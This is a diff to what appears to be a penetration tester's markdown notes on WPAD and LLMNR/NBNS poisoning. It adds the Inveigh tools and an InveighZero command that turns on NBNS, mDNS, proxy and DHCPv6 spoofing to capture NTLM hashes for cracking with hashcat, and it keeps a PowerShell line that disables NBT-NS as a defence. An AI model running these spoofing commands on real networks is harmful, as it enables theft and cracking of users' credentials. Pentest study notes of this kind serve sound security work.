@@ -4,7 +4,7 @@
 
 ## WPAD (Web Proxy Auto-Discovery)
 
-### Tools: Responder, Hashcat, ntlm_theft.py
+### Tools: Responder, Hashcat, ntlm_theft.py, Invoke-Inveigh, Inveighzero https://github.com/Kevin-Robertson/Inveigh
 
 ### Github repo: https://github.com/Greenwolf/ntlm_theft
 
@@ -32,6 +32,8 @@
 
 #### 7) Crack with hashcat
 
+### .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6
+
 #### More information:
 
 | Command                                                      | Description                                                  |
@@ -43,3 +45,5 @@
 | `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
 | `.\Inveigh.exe`                                              | Starts the `C#` implementation of `Inveigh` from a Windows-based host. |
 | `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |
+
+
